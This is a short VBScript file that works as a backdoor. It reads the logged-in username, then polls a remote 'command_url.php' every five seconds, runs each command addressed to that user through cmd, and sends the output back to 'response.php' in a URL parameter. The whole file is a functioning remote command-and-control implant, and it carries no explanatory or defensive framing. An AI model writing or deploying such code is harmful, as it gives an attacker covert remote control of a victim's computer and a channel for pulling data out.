Set objShell = WScript.CreateObject("WScript.Shell")
Set o = CreateObject("MSXML2.XMLHTTP")
Set a = CreateObject("MSXML2.XMLHTTP")
Set objExecObject = objShell.Exec("cmd /c echo b.a.c.k.d.o.o.r..u.s.e.r: %username% ")
username = objExecObject.StdOut.ReadLine()

Do While True:
     o.open "GET", "command_url.php"
     o.send
     WScript.Sleep(5000)
     command = o.responseText
     If InStr(1,command,username) > 0 Then
          command = replace(command,username,"")
          Set objExecObject = objShell.Exec("cmd /c "+command)
          Do
               strFromProc = objExecObject.StdOut.ReadLine()
          Loop While Not objExecObject.Stdout.atEndOfStream
          WScript.Echo strFromProc
          o.open "GET", "response.php?return="+strFromProc
          o.send
     End If
     command = ""
     strFromProc = ""
     WScript.Sleep(5000)
Loop
